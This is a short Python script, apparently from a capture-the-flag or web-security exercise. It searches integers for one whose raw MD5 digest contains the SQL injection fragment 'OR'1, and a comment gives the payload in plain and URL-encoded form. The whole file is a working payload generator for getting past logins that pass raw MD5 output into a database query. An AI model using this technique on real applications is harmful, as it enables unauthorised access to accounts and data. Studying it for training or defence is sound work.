#'OR'1 -- %27OR%271
#find text that when md5 hashed == 'OR'1
import hashlib
import sys

ciphertext = b"'OR'1"
ciphertext2 = b"'Or'1"
ciphertext3 = b"'or'1"
ciphertext4 = b"'oR'1"
for i in range(0, sys.maxsize):
    hash = hashlib.md5(str(i).encode('UTF-8')).digest()
    if not ((hash.find(ciphertext) == -1) & (hash.find(ciphertext2) == -1) & (hash.find(ciphertext3) == -1) & (hash.find(ciphertext4) == -1)):
        print(i)
        break
